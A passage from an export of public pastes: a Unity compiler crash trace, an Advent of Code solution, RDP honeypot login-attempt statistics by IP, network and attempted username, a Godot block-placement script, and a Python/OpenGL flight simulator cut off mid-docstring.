4.	Running pass 'ARM Instruction Selection' on function '@U3CU3CInternalWriteEndAsyncU3Eg__AwaitPropertyU7C11_0U3Ed_MoveNext_mC69ECC163AA17C93589D91B7C90A3B52CF496967'
#0 0x000000fa6adfa948 
#1 0x00007ff773051ec8 C:\Program Files\Unity\Hub\Editor\2022.3.5f1\Editor\Data\PlaybackEngines\AndroidPlayer\NDK\toolchains\llvm\prebuilt\windows-x86_64\bin\clang++.exe 0x4ab1ec8 
0x000000FA6ADFA948 (0x0000000000000000 0x000002DA30EF7D90 0x000000FA6ADFA948 0x0000000000000000) <unknown module>
0x00007FF773051EC8 (0x000002DA30EF7D90 0x000000FA6ADFA948 0x0000000000000000 0x0000000000000000)

UnityEngine.GUIUtility:ProcessEvent (int,intptr,bool&)"
ejTsRsqD,Advent of code 2023 day 19 part2 improved,hhoppe,Python,Tuesday 19th of December 2023 07:12:05 PM CDT,"def day19_part2(s):
  s_rules, _ = s.split('\n\n')
  rules = {}
  for line in s_rules.splitlines():
    name, s_rules = line[:-1].split('{')
    rules[name] = s_rules.split(',')

  def compute(name, intervals):
    if name == 'R' or any(start >= stop for start, stop in intervals.values()):
      return 0
    if name == 'A':
      return math.prod(stop - start for start, stop in intervals.values())

    total = 0
    for rule in rules[name]:
      if rule.isalpha():
        return total + compute(rule, intervals)

      category, op, s_num, label = re.match(r'^(\w)([<>])(\d+):(\w+)$', rule).groups()
      num = int(s_num)
      start, stop = intervals[category]
      if op == '<':
        total += compute(label, intervals | {category: (start, min(stop, num))})
        intervals[category] = max(start, num), stop
      else:
        total += compute(label, intervals | {category: (max(start, num + 1), stop)})
        intervals[category] = start, min(stop, num + 1)

  return compute('in', {category: (1, 4001) for category in 'xmas'})"
23AQL6FB,2023-12-19_stats.json,rdp_snitch,JSON,Tuesday 19th of December 2023 06:18:18 PM CDT,"{
  ""ip"": {
    ""103.178.235.43"": 222,
    ""88.214.26.3"": 12,
    ""103.76.139.213"": 3,
    ""43.156.144.223"": 3,
    ""103.142.86.61"": 3,
    ""58.218.204.183"": 12,
    ""62.204.41.208"": 18,
    ""205.210.31.169"": 9,
    ""141.98.81.79"": 3,
    ""87.251.75.145"": 9,
    ""130.162.52.206"": 6,
    ""64.227.155.120"": 3,
    ""185.170.144.113"": 36,
    ""194.165.16.37"": 6,
    ""167.94.146.57"": 3,
    ""185.170.144.3"": 3,
    ""209.222.98.33"": 9,
    ""198.235.24.185"": 9,
    ""162.248.102.225"": 3,
    ""3.16.147.134"": 6,
    ""135.125.216.200"": 3,
    ""89.187.175.23"": 3,
    ""212.70.149.146"": 9,
    ""152.32.149.246"": 3,
    ""15.204.9.251"": 3,
    ""155.159.254.132"": 3,
    ""198.235.24.58"": 9,
    ""14.39.154.231"": 3,
    ""45.227.254.49"": 6,
    ""212.102.40.36"": 3,
    ""87.251.75.64"": 3,
    ""173.255.249.242"": 12,
    ""143.110.136.35"": 3,
    ""154.53.167.3"": 3,
    ""167.94.138.49"": 3,
    ""106.246.227.18"": 6,
    ""198.235.24.235"": 9,
    ""147.78.47.31"": 3,
    ""142.4.218.114"": 3,
    ""110.86.3.66"": 3,
    ""91.240.118.29"": 3
  },
  ""asn"": {
    ""AS140810"": 222,
    ""AS209132"": 12,
    ""AS135746"": 3,
    ""AS132203"": 3,
    ""AS138152"": 3,
    ""AS4134"": 15,
    ""AS59425"": 18,
    ""AS396982"": 36,
    ""AS209588"": 6,
    ""AS208091"": 12,
    ""AS31898"": 6,
    ""AS14061"": 6,
    ""AS197414"": 39,
    ""AS48721"": 6,
    ""AS398705"": 3,
    ""AS23470"": 9,
    ""AS397031"": 3,
    ""AS16509"": 6,
    ""AS16276"": 9,
    ""AS60068"": 6,
    ""AS204428"": 9,
    ""AS135377"": 3,
    ""AS137951"": 3,
    ""AS4766"": 3,
    ""AS267784"": 6,
    ""AS63949"": 12,
    ""AS62425"": 3,
    ""AS398324"": 3,
    ""AS3786"": 6,
    ""AS57523"": 3
  },
  ""isp"": {
    ""VPSTTT"": 222,
    ""Alviva Holding Limited"": 12,
    ""Cityline Networks Pvt Ltd"": 3,
    ""Shenzhen Tencent Computer Systems Company Limited"": 3,
    ""Yisu Cloud LTD"": 3,
    ""Chinanet"": 15,
    ""Horizon LLC"": 18,
    ""Google LLC"": 36,
    ""Flyservers S.A."": 18,
    ""Xhost Internet Solutions LP"": 51,
    ""Oracle Corporation"": 6,
    ""DigitalOcean, LLC"": 6,
    ""Censys, Inc."": 6,
    ""ReliableSite.Net LLC"": 9,
    ""GALAXYGATE, LLC"": 3,
    ""Amazon.com, Inc."": 6,
    ""OVH SAS"": 9,
    ""Datacamp Limited"": 6,
    ""SS-Net"": 9,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Clayer Limited"": 3,
    ""Korea Telecom"": 3,
    ""Akamai Technologies, Inc."": 12,
    ""Mailbox Internet Hizmetleri Ltd. Sti."": 3,
    ""LG DACOM Corporation"": 6,
    ""Chang Way Technologies Co. Limited"": 3
  },
  ""org"": {
    ""VPSTTT Technology Company Limited"": 222,
    ""FutureNow Incorporated"": 12,
    ""Cityline Networks Pvt Ltd"": 3,
    ""Tencent Cloud Computing"": 3,
    ""SHENGYD(HK)LIMITED"": 3,
    ""Chinanet JS"": 12,
    ""Horizon LLC"": 18,
    ""Palo Alto Networks, Inc"": 36,
    ""Flyservers S.A"": 12,
    ""Xhost Internet Solutions"": 12,
    ""Oracle Cloud Infrastructure (eu-frankfurt-1)"": 6,
    ""DigitalOcean, LLC"": 3,
    ""Xhostis"": 39,
    ""Censys, Inc."": 3,
    ""ReliableSite.Net LLC"": 9,
    ""GALAXYGATE, LLC"": 3,
    ""AWS EC2 (us-east-2)"": 6,
    ""OVH GmbH"": 3,
    ""DataCamp Limited"": 3,
    ""4Media Ltd"": 9,
    ""Ucloud Information Technology"": 3,
    ""OVH US LLC"": 3,
    ""Safren Computer Services"": 3,
    ""Kornet"": 3,
    ""UAB Host Baltic"": 6,
    ""Cdn77 DAL"": 3,
    ""Linode"": 12,
    ""Digital Ocean"": 3,
    ""Kuzey Veri Merkezi Anonim Sirketi"": 3,
    ""Censys, Inc"": 3,
    ""Boranet"": 6,
    ""OVH Hosting, Inc."": 3,
    ""Chinanet FJ"": 3,
    ""Chang Way Technologies Co. Limited"": 3
  },
  ""regionName"": {
    ""Ho Chi Minh"": 222,
    ""English River"": 12,
    ""Uttar Pradesh"": 3,
    ""North West"": 3,
    ""Wan Chai"": 3,
    ""Jiangsu"": 12,
    ""Moscow"": 21,
    ""California"": 51,
    ""Drenthe"": 3,
    ""North Holland"": 54,
    ""Hesse"": 12,
    ""Karnataka"": 3,
    ""Kaunas"": 6,
    ""New Jersey"": 9,
    ""Texas"": 9,
    ""Ohio"": 6,
    ""Plovdiv"": 9,
    ""Virginia"": 3,
    ""Oregon"": 3,
    ""Illinois"": 3,
    ""Seoul"": 3,
    ""Vilnius"": 6,
    ""Istanbul"": 3,
    ""Michigan"": 3,
    ""Gyeonggi-do"": 6,
    ""Quebec"": 3,
    ""Fujian"": 3
  },
  ""country"": {
    ""Vietnam"": 222,
    ""Seychelles"": 12,
    ""India"": 6,
    ""Singapore"": 3,
    ""Hong Kong"": 3,
    ""China"": 15,
    ""Russia"": 21,
    ""United States"": 87,
    ""The Netherlands"": 57,
    ""Germany"": 12,
    ""Lithuania"": 12,
    ""Bulgaria"": 9,
    ""South Korea"": 9,
    ""T\u00fcrkiye"": 3,
    ""Canada"": 3
  },
  ""account"": {
    ""hello"": 282,
    ""z1cyqaj2"": 12,
    ""Test"": 27,
    ""lXCdHtmvU"": 3,
    ""zaygvi"": 3,
    ""gvUqlR"": 3,
    ""Administr"": 24,
    ""Domain"": 57,
    ""(empty)"": 15,
    ""WsabIeoVH"": 3,
    ""FwdRwG"": 3,
    ""qbqfrU"": 3,
    ""Administrator"": 6,
    ""osXxxfaNh"": 3,
    ""rrdLTP"": 3,
    ""SwaxxL"": 3,
    ""n01myvi4"": 12,
    ""beio"": 3,
    ""ajfqLtWYT"": 3,
    ""PJadrG"": 3,
    ""giZItv"": 3
  },
  ""keyboard"": {
    ""Unknown"": 474
  },
  ""client_build"": {
    ""Unknown"": 474
  },
  ""client_name"": {
    ""Unknown"": 474
  },
  ""ip_type"": {
    ""Unknown"": 351,
    ""hosting"": 87,
    ""proxy"": 24,
    ""hosting & proxy"": 9,
    ""mobile"": 3
  }
}"
7skk3fzu,2023-12-19_stats.json,rdp_snitch,JSON,Tuesday 19th of December 2023 06:16:17 PM CDT,"{
  ""ip"": {
    ""103.178.235.43"": 148,
    ""88.214.26.3"": 8,
    ""103.76.139.213"": 2,
    ""43.156.144.223"": 2,
    ""103.142.86.61"": 2,
    ""58.218.204.183"": 8,
    ""62.204.41.208"": 12,
    ""205.210.31.169"": 6,
    ""141.98.81.79"": 2,
    ""87.251.75.145"": 6,
    ""130.162.52.206"": 4,
    ""64.227.155.120"": 2,
    ""185.170.144.113"": 24,
    ""194.165.16.37"": 4,
    ""167.94.146.57"": 2,
    ""185.170.144.3"": 2,
    ""209.222.98.33"": 6,
    ""198.235.24.185"": 6,
    ""162.248.102.225"": 2,
    ""3.16.147.134"": 4,
    ""135.125.216.200"": 2,
    ""89.187.175.23"": 2,
    ""212.70.149.146"": 6,
    ""152.32.149.246"": 2,
    ""15.204.9.251"": 2,
    ""155.159.254.132"": 2,
    ""198.235.24.58"": 6,
    ""14.39.154.231"": 2,
    ""45.227.254.49"": 4,
    ""212.102.40.36"": 2,
    ""87.251.75.64"": 2,
    ""173.255.249.242"": 8,
    ""143.110.136.35"": 2,
    ""154.53.167.3"": 2,
    ""167.94.138.49"": 2,
    ""106.246.227.18"": 4,
    ""198.235.24.235"": 6,
    ""147.78.47.31"": 2,
    ""142.4.218.114"": 2,
    ""110.86.3.66"": 2,
    ""91.240.118.29"": 2
  },
  ""asn"": {
    ""AS140810"": 148,
    ""AS209132"": 8,
    ""AS135746"": 2,
    ""AS132203"": 2,
    ""AS138152"": 2,
    ""AS4134"": 10,
    ""AS59425"": 12,
    ""AS396982"": 24,
    ""AS209588"": 4,
    ""AS208091"": 8,
    ""AS31898"": 4,
    ""AS14061"": 4,
    ""AS197414"": 26,
    ""AS48721"": 4,
    ""AS398705"": 2,
    ""AS23470"": 6,
    ""AS397031"": 2,
    ""AS16509"": 4,
    ""AS16276"": 6,
    ""AS60068"": 4,
    ""AS204428"": 6,
    ""AS135377"": 2,
    ""AS137951"": 2,
    ""AS4766"": 2,
    ""AS267784"": 4,
    ""AS63949"": 8,
    ""AS62425"": 2,
    ""AS398324"": 2,
    ""AS3786"": 4,
    ""AS57523"": 2
  },
  ""isp"": {
    ""VPSTTT"": 148,
    ""Alviva Holding Limited"": 8,
    ""Cityline Networks Pvt Ltd"": 2,
    ""Shenzhen Tencent Computer Systems Company Limited"": 2,
    ""Yisu Cloud LTD"": 2,
    ""Chinanet"": 10,
    ""Horizon LLC"": 12,
    ""Google LLC"": 24,
    ""Flyservers S.A."": 12,
    ""Xhost Internet Solutions LP"": 34,
    ""Oracle Corporation"": 4,
    ""DigitalOcean, LLC"": 4,
    ""Censys, Inc."": 4,
    ""ReliableSite.Net LLC"": 6,
    ""GALAXYGATE, LLC"": 2,
    ""Amazon.com, Inc."": 4,
    ""OVH SAS"": 6,
    ""Datacamp Limited"": 4,
    ""SS-Net"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Clayer Limited"": 2,
    ""Korea Telecom"": 2,
    ""Akamai Technologies, Inc."": 8,
    ""Mailbox Internet Hizmetleri Ltd. Sti."": 2,
    ""LG DACOM Corporation"": 4,
    ""Chang Way Technologies Co. Limited"": 2
  },
  ""org"": {
    ""VPSTTT Technology Company Limited"": 148,
    ""FutureNow Incorporated"": 8,
    ""Cityline Networks Pvt Ltd"": 2,
    ""Tencent Cloud Computing"": 2,
    ""SHENGYD(HK)LIMITED"": 2,
    ""Chinanet JS"": 8,
    ""Horizon LLC"": 12,
    ""Palo Alto Networks, Inc"": 24,
    ""Flyservers S.A"": 8,
    ""Xhost Internet Solutions"": 8,
    ""Oracle Cloud Infrastructure (eu-frankfurt-1)"": 4,
    ""DigitalOcean, LLC"": 2,
    ""Xhostis"": 26,
    ""Censys, Inc."": 2,
    ""ReliableSite.Net LLC"": 6,
    ""GALAXYGATE, LLC"": 2,
    ""AWS EC2 (us-east-2)"": 4,
    ""OVH GmbH"": 2,
    ""DataCamp Limited"": 2,
    ""4Media Ltd"": 6,
    ""Ucloud Information Technology"": 2,
    ""OVH US LLC"": 2,
    ""Safren Computer Services"": 2,
    ""Kornet"": 2,
    ""UAB Host Baltic"": 4,
    ""Cdn77 DAL"": 2,
    ""Linode"": 8,
    ""Digital Ocean"": 2,
    ""Kuzey Veri Merkezi Anonim Sirketi"": 2,
    ""Censys, Inc"": 2,
    ""Boranet"": 4,
    ""OVH Hosting, Inc."": 2,
    ""Chinanet FJ"": 2,
    ""Chang Way Technologies Co. Limited"": 2
  },
  ""regionName"": {
    ""Ho Chi Minh"": 148,
    ""English River"": 8,
    ""Uttar Pradesh"": 2,
    ""North West"": 2,
    ""Wan Chai"": 2,
    ""Jiangsu"": 8,
    ""Moscow"": 14,
    ""California"": 34,
    ""Drenthe"": 2,
    ""North Holland"": 36,
    ""Hesse"": 8,
    ""Karnataka"": 2,
    ""Kaunas"": 4,
    ""New Jersey"": 6,
    ""Texas"": 6,
    ""Ohio"": 4,
    ""Plovdiv"": 6,
    ""Virginia"": 2,
    ""Oregon"": 2,
    ""Illinois"": 2,
    ""Seoul"": 2,
    ""Vilnius"": 4,
    ""Istanbul"": 2,
    ""Michigan"": 2,
    ""Gyeonggi-do"": 4,
    ""Quebec"": 2,
    ""Fujian"": 2
  },
  ""country"": {
    ""Vietnam"": 148,
    ""Seychelles"": 8,
    ""India"": 4,
    ""Singapore"": 2,
    ""Hong Kong"": 2,
    ""China"": 10,
    ""Russia"": 14,
    ""United States"": 58,
    ""The Netherlands"": 38,
    ""Germany"": 8,
    ""Lithuania"": 8,
    ""Bulgaria"": 6,
    ""South Korea"": 6,
    ""T\u00fcrkiye"": 2,
    ""Canada"": 2
  },
  ""account"": {
    ""hello"": 188,
    ""z1cyqaj2"": 8,
    ""Test"": 18,
    ""lXCdHtmvU"": 2,
    ""zaygvi"": 2,
    ""gvUqlR"": 2,
    ""Administr"": 16,
    ""Domain"": 38,
    ""(empty)"": 10,
    ""WsabIeoVH"": 2,
    ""FwdRwG"": 2,
    ""qbqfrU"": 2,
    ""Administrator"": 4,
    ""osXxxfaNh"": 2,
    ""rrdLTP"": 2,
    ""SwaxxL"": 2,
    ""n01myvi4"": 8,
    ""beio"": 2,
    ""ajfqLtWYT"": 2,
    ""PJadrG"": 2,
    ""giZItv"": 2
  },
  ""keyboard"": {
    ""Unknown"": 316
  },
  ""client_build"": {
    ""Unknown"": 316
  },
  ""client_name"": {
    ""Unknown"": 316
  },
  ""ip_type"": {
    ""Unknown"": 234,
    ""hosting"": 58,
    ""proxy"": 16,
    ""hosting & proxy"": 6,
    ""mobile"": 2
  }
}"
2gwTtvPu,2023-12-19_stats.json,rdp_snitch,JSON,Tuesday 19th of December 2023 06:15:09 PM CDT,"{
  ""ip"": {
    ""103.178.235.43"": 74,
    ""88.214.26.3"": 4,
    ""103.76.139.213"": 1,
    ""43.156.144.223"": 1,
    ""103.142.86.61"": 1,
    ""58.218.204.183"": 4,
    ""62.204.41.208"": 6,
    ""205.210.31.169"": 3,
    ""141.98.81.79"": 1,
    ""87.251.75.145"": 3,
    ""130.162.52.206"": 2,
    ""64.227.155.120"": 1,
    ""185.170.144.113"": 12,
    ""194.165.16.37"": 2,
    ""167.94.146.57"": 1,
    ""185.170.144.3"": 1,
    ""209.222.98.33"": 3,
    ""198.235.24.185"": 3,
    ""162.248.102.225"": 1,
    ""3.16.147.134"": 2,
    ""135.125.216.200"": 1,
    ""89.187.175.23"": 1,
    ""212.70.149.146"": 3,
    ""152.32.149.246"": 1,
    ""15.204.9.251"": 1,
    ""155.159.254.132"": 1,
    ""198.235.24.58"": 3,
    ""14.39.154.231"": 1,
    ""45.227.254.49"": 2,
    ""212.102.40.36"": 1,
    ""87.251.75.64"": 1,
    ""173.255.249.242"": 4,
    ""143.110.136.35"": 1,
    ""154.53.167.3"": 1,
    ""167.94.138.49"": 1,
    ""106.246.227.18"": 2,
    ""198.235.24.235"": 3,
    ""147.78.47.31"": 1,
    ""142.4.218.114"": 1,
    ""110.86.3.66"": 1,
    ""91.240.118.29"": 1
  },
  ""asn"": {
    ""AS140810"": 74,
    ""AS209132"": 4,
    ""AS135746"": 1,
    ""AS132203"": 1,
    ""AS138152"": 1,
    ""AS4134"": 5,
    ""AS59425"": 6,
    ""AS396982"": 12,
    ""AS209588"": 2,
    ""AS208091"": 4,
    ""AS31898"": 2,
    ""AS14061"": 2,
    ""AS197414"": 13,
    ""AS48721"": 2,
    ""AS398705"": 1,
    ""AS23470"": 3,
    ""AS397031"": 1,
    ""AS16509"": 2,
    ""AS16276"": 3,
    ""AS60068"": 2,
    ""AS204428"": 3,
    ""AS135377"": 1,
    ""AS137951"": 1,
    ""AS4766"": 1,
    ""AS267784"": 2,
    ""AS63949"": 4,
    ""AS62425"": 1,
    ""AS398324"": 1,
    ""AS3786"": 2,
    ""AS57523"": 1
  },
  ""isp"": {
    ""VPSTTT"": 74,
    ""Alviva Holding Limited"": 4,
    ""Cityline Networks Pvt Ltd"": 1,
    ""Shenzhen Tencent Computer Systems Company Limited"": 1,
    ""Yisu Cloud LTD"": 1,
    ""Chinanet"": 5,
    ""Horizon LLC"": 6,
    ""Google LLC"": 12,
    ""Flyservers S.A."": 6,
    ""Xhost Internet Solutions LP"": 17,
    ""Oracle Corporation"": 2,
    ""DigitalOcean, LLC"": 2,
    ""Censys, Inc."": 2,
    ""ReliableSite.Net LLC"": 3,
    ""GALAXYGATE, LLC"": 1,
    ""Amazon.com, Inc."": 2,
    ""OVH SAS"": 3,
    ""Datacamp Limited"": 2,
    ""SS-Net"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Clayer Limited"": 1,
    ""Korea Telecom"": 1,
    ""Akamai Technologies, Inc."": 4,
    ""Mailbox Internet Hizmetleri Ltd. Sti."": 1,
    ""LG DACOM Corporation"": 2,
    ""Chang Way Technologies Co. Limited"": 1
  },
  ""org"": {
    ""VPSTTT Technology Company Limited"": 74,
    ""FutureNow Incorporated"": 4,
    ""Cityline Networks Pvt Ltd"": 1,
    ""Tencent Cloud Computing"": 1,
    ""SHENGYD(HK)LIMITED"": 1,
    ""Chinanet JS"": 4,
    ""Horizon LLC"": 6,
    ""Palo Alto Networks, Inc"": 12,
    ""Flyservers S.A"": 4,
    ""Xhost Internet Solutions"": 4,
    ""Oracle Cloud Infrastructure (eu-frankfurt-1)"": 2,
    ""DigitalOcean, LLC"": 1,
    ""Xhostis"": 13,
    ""Censys, Inc."": 1,
    ""ReliableSite.Net LLC"": 3,
    ""GALAXYGATE, LLC"": 1,
    ""AWS EC2 (us-east-2)"": 2,
    ""OVH GmbH"": 1,
    ""DataCamp Limited"": 1,
    ""4Media Ltd"": 3,
    ""Ucloud Information Technology"": 1,
    ""OVH US LLC"": 1,
    ""Safren Computer Services"": 1,
    ""Kornet"": 1,
    ""UAB Host Baltic"": 2,
    ""Cdn77 DAL"": 1,
    ""Linode"": 4,
    ""Digital Ocean"": 1,
    ""Kuzey Veri Merkezi Anonim Sirketi"": 1,
    ""Censys, Inc"": 1,
    ""Boranet"": 2,
    ""OVH Hosting, Inc."": 1,
    ""Chinanet FJ"": 1,
    ""Chang Way Technologies Co. Limited"": 1
  },
  ""regionName"": {
    ""Ho Chi Minh"": 74,
    ""English River"": 4,
    ""Uttar Pradesh"": 1,
    ""North West"": 1,
    ""Wan Chai"": 1,
    ""Jiangsu"": 4,
    ""Moscow"": 7,
    ""California"": 17,
    ""Drenthe"": 1,
    ""North Holland"": 18,
    ""Hesse"": 4,
    ""Karnataka"": 1,
    ""Kaunas"": 2,
    ""New Jersey"": 3,
    ""Texas"": 3,
    ""Ohio"": 2,
    ""Plovdiv"": 3,
    ""Virginia"": 1,
    ""Oregon"": 1,
    ""Illinois"": 1,
    ""Seoul"": 1,
    ""Vilnius"": 2,
    ""Istanbul"": 1,
    ""Michigan"": 1,
    ""Gyeonggi-do"": 2,
    ""Quebec"": 1,
    ""Fujian"": 1
  },
  ""country"": {
    ""Vietnam"": 74,
    ""Seychelles"": 4,
    ""India"": 2,
    ""Singapore"": 1,
    ""Hong Kong"": 1,
    ""China"": 5,
    ""Russia"": 7,
    ""United States"": 29,
    ""The Netherlands"": 19,
    ""Germany"": 4,
    ""Lithuania"": 4,
    ""Bulgaria"": 3,
    ""South Korea"": 3,
    ""T\u00fcrkiye"": 1,
    ""Canada"": 1
  },
  ""account"": {
    ""hello"": 94,
    ""z1cyqaj2"": 4,
    ""Test"": 9,
    ""lXCdHtmvU"": 1,
    ""zaygvi"": 1,
    ""gvUqlR"": 1,
    ""Administr"": 8,
    ""Domain"": 19,
    ""(empty)"": 5,
    ""WsabIeoVH"": 1,
    ""FwdRwG"": 1,
    ""qbqfrU"": 1,
    ""Administrator"": 2,
    ""osXxxfaNh"": 1,
    ""rrdLTP"": 1,
    ""SwaxxL"": 1,
    ""n01myvi4"": 4,
    ""beio"": 1,
    ""ajfqLtWYT"": 1,
    ""PJadrG"": 1,
    ""giZItv"": 1
  },
  ""keyboard"": {
    ""Unknown"": 158
  },
  ""client_build"": {
    ""Unknown"": 158
  },
  ""client_name"": {
    ""Unknown"": 158
  },
  ""ip_type"": {
    ""Unknown"": 117,
    ""hosting"": 29,
    ""proxy"": 8,
    ""hosting & proxy"": 3,
    ""mobile"": 1
  }
}"
W59FH47U,Untitled,Socky,GDScript,Tuesday 19th of December 2023 06:06:15 PM CDT,"extends Node
 
var object = null
 
var radius := 2
var map := {}
 
var putPos : Vector3 = Vector3.ZERO
 
var t = [""block1""]
 
func _mouse_pos():
	var camera = $Camera3D
	var mouse = get_viewport().get_mouse_position()
	var result = camera.project_position(mouse, 10.0)
	return Vector3(result.x, 0, result.z).snapped(Vector3(1,0.5,1))
	
func _ready():
	_spawn_block()
	
func _physics_process(delta):
	var tar = _mouse_pos() - Vector3(object.size.x/2, 0, object.size.z/2)
	var p = _update_target(tar, object)
	object.global_position = putPos
	
	if Input.is_action_just_pressed(""ui_accept""):
		if !p: return
		_mark_block(putPos, object.size)
		_spawn_block()
		
func _spawn_block():
	var x = t[randi() % t.size()]
	var loaded = load(""res://%s.tscn"" % x)
	object = loaded.instantiate()
	object.get_child(0).position = Vector3(object.size.x/2, 0, object.size.z/2)
	object.get_child(0).material.albedo_color = Color(randi_range(0,4),randi_range(0,4),randi_range(0,4),1)
	add_child(object)
		
func _update_target(target: Vector3, block: Node3D):
	var check = false
	var range = _get_radius(target)
	var c = null
	for i in range:
		var hasBlock = _has_block(i, block.size)
		if not hasBlock and (c == null or i.distance_to(target) < c.distance_to(target)):
			check = true
			c = i
	if c != null: putPos = c
	return check
 
func _get_radius(target: Vector3):
	var result := []
	for x in range(-radius, radius + 1):
		for z in range(-radius, radius + 1):
			var point = Vector3(target.x + x, 0, target.z + z)
			result.append(point)
	return result
	
func _has_block(p: Vector3, s: Vector3):
	for x in range(s.x):
		for z in range(s.z):
			var key = Vector3(p.x + x, p.y, p.z + z)
			if map.has(key):
				return true
	return false
	
func _mark_block(p: Vector3, s: Vector3):
	for x in range(s.x):
		for z in range(s.z):
			map[Vector3(p.x + x, p.y, p.z + z)] = object
"
rbubwA3d,QUATERNION_RODRIGUES_ALTMANN_COMPOSITE_AXIS_ANGLE_ROTATION,mechanizmos58,Python,Tuesday 19th of December 2023 05:59:10 PM CDT,"'''

MULTIPLE COMPOSITE AXIS-ANGLE ROTATION MICRO FLIGHT SIMULATOR

# 07_10_23
# ...
# 11_11_23 # SUCCESS! NO MORE EULER ANGLES - ROTATION ORDER DOESN'T MATTER NOW
# 14_12_23 # from numpy..., glMultMatrix...
# 20_12_23

# MOUSE & KEYS
#
UP KEY - INCREASE VELOCITY
DOWN KEY - BRAKE
MOUSE LEFT, RIGHT - TURN
MOUSE UP, DOWN - PITCH
LEFT, RIGHT KEYS - ROLL
PAUSE, BREAK - PAUSE
SPACE -  VELOCITY = 0
ENTER, ESC - EXIT

'''

from math import acos, degrees, sin, cos, sqrt
from numpy import append, arange, array, concatenate, identity
from numpy import outer, zeros, hstack, vstack, empty
from OpenGL.GL import *
from OpenGL.GLU import *
import pygame
from pygame.locals import *
import sys


def main():

    # ~ print()
    # ~ print(rotate_r.__doc__)
    # ~ print()
    # ~ print(composite_rotation.__doc__)
    # ~ print(rotation_matrix_4x4.__doc__)

    # ~ clock = pygame.time.Clock()

    screenwidth = 1920
    screenheight = 1080
    sw2 = screenwidth/2.0
    sh2 = screenheight/2.0

    pygame.init()
    pygame.display.set_caption('ESC or RETURN exits')
    gl_init(screenwidth, screenheight, FULL_SCREEN=1)

    make_hoops1()
    make_hoops2()
    make_ground()

    pygame.mouse.set_visible(0)
    pygame.mouse.set_pos([sw2, sh2])

    PAUSE = 0
    JOYSTICK = 0

    I3 = identity(3)
    I4 = identity(4)
    Z3 = zeros((3,3))
    Z4 = zeros((4,4))
    vec3 = empty((3))

    pos = array([0.0, 170.0, 600.0])

    velocity = 0.0
    Phi = 0.0
    Theta = 0.0
    Psi = 0.0

    R = array([1.0, 0.0, 0.0]) # RIGHT (E1)
    U = array([0.0, 1.0, 0.0]) # UP (E2)
    B = array([0.0, 0.0, 1.0]) # BACK (E3)

    glTranslate(0.0, 0.0, -5.0)

    if JOYSTICK:
        joystick = pygame.joystick.Joystick(0)
        joystick.init()

    while 1:

        KEYS = pygame.key.get_pressed()

        if KEYS[K_UP]:
            velocity += 0.08
            if velocity > 8.0:
                velocity = 8.0

        if KEYS[K_DOWN]:
            velocity -= 0.04
            if velocity < 0.0:
                velocity = 0.0

        for event in pygame.event.get():

            if event.type == QUIT:
                pygame.quit()
                return

            elif event.type == KEYDOWN:
                if event.key in [K_ESCAPE, K_RETURN]:
                    pygame.quit()
                    return
                elif event.key == K_PAUSE:
                    PAUSE ^= 1
                elif event.key == K_SPACE:
                    velocity = 0.0

        if PAUSE: continue

        glClear(GL_COLOR_BUFFER_BIT|GL_DEPTH_BUFFER_BIT)

        mousex, mousey = pygame.mouse.get_pos()

        if JOYSTICK:
            # YAW (LEFT, RIGHT)
            Phi  = joystick.get_axis(2) / 80.0
            # PITCH (UP, DOWN)
            Theta = -joystick.get_axis(1) / 80.0
            # ROLL (CW, CCW)
            Psi = -joystick.get_axis(0) / 100.0
        else:
            # YAW (LEFT, RIGHT)
            Phi = (mousex - sw2) / 1.0e5
            # PITCH (UP, DOWN)
            Theta = (mousey - sh2) / 5.0e4
            # ROLL (CW, CCW)
            Psi = 0.0
            if KEYS[K_LEFT]:
                Psi = 0.01
            if KEYS[K_RIGHT]:
                Psi = -0.01

        # COMPOSE A SINGLE ANGLE-AXIS ROTATION FROM BODY FRAME AXIS ROTATIONS
        # (ORDER DOESN'T MATTER)
        #
        Gamma, E = composite_rotation(-B, Psi, U, Phi, vec3)
        Gamma, E = composite_rotation(E, Gamma, R, Theta, vec3)

        if 1:
            C = rotation_matrix_4x4(Gamma, E, I4, Z4)
            glMultMatrixd(C)
        else:
            glRotatef(degrees(Gamma), *E)

        R = rotate_r(R, E, -Gamma, vec3)
        U = rotate_r(U, E, -Gamma, vec3)
        B = rotate_r(B, E, -Gamma, vec3)

        glPushMatrix()

        pos += -B * velocity
        glTranslatef(*-pos)

        glColor3f(0.0, 0.0, 1.0)
        glCallList(g.hatch_ground)
        glColor3f(0.7, 0.0, 0.0)
        glCallList(g.square_hoops1)
        glColor3f(0.0, 0.7, 0.7)
        glCallList(g.square_hoops2)

        glPopMatrix()

        pygame.display.flip()
        pygame.time.wait(10)
        # ~ clock.tick(100)


def normalize(v):
    norm = sqrt(v[0]**2 + v[1]**2 + v[2]**2)
    if norm > 0.0:
        return v / norm
    return v


def magnitude(v):
    return sqrt(v[0]**2 + v[1]**2 + v[2]**2)


def npcross(u, v):
    x = u[1]*v[2] - u[2]*v[1]
    y = u[2]*v[0] - u[0]*v[2]
    z = u[0]*v[1] - u[1]*v[0]
    return array([x,y,z])


def rotate_r(r, e, 𝚹, cross_er):

    """"""

 Rodrigues finite rotation formula for numpy

 Rodrigues' rotation formula, Wikipedia

 Rotation Transforms for Computer Graphics, John Vince (2011), p.139
 Classical Mechanics, Goldstein et al. p. 162 (""the rotation formula"")
 Computer Graphics Software Construction, John R. Rankin (1989), p.279
 Quaternions for Computer Graphics, John Vince (2011) pp. 80-, 123(!)
 (Demonstrates the equivalence of Quaternion rotation and Rodrigues rotation)

 In matrix form:
 Analytical Mechanics of Space Systems by Schaub & Junkins eq.3.82 (p.105)
 in video: Axis-Angles, Euler Parameters, Quaternions Matlab Examples
   by Shane Ross (RossDynamicsLab) starting at 25 minutes
 Graphics Gems (1990), p.503-5 (Patrick-Gilles Maillot)
 Do We Really Need Quaternions? by Diana Gruber (2000)
 (Demonstrates the equivalence of the Quaternion matrix and the
    direction cosine matrix from Graphics Gems (1990),
    and Schaub & Junkins p.102, which can be generated by the
    Rodrigues matrix formulation - see def rodrigues_matrix())

Rotations, Quaternions, and Double Groups
by Simon L. Altmann (1986 book), p.159

Hamilton, Rodrigues, and the Quaternion Scandal
by Simon L. Altmann (1989 paper), p.302-3
 ""...Rodrigues's couples are, therefore, quaternions...""


 Does not check if e is normalized

 Rotation is right-hand direction

 r is the position vector to rotate
 e is the unit direction vector about which to rotate
  𝚹 is the rotation angle in radians

    """"""

